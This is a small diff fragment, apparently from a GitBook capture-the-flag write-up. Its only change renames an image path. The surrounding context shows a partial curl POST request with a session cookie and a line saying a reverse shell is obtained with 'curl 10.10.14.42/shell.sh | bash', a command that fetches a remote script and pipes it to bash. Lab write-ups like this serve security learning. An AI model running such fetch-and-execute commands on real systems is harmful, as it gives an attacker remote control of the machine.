@@ -202,7 +202,7 @@ $ curl -X POST -H 'Content-Type: application/json' -H 'Cookie: PHPSESSID=1mf4jaa
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (43) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (43) (1) (4).png" alt=""><figcaption></figcaption></figure>
 
 We can get a reverse shell by replacing the command with `curl 10.10.14.42/shell.sh | bash`.&#x20;
 
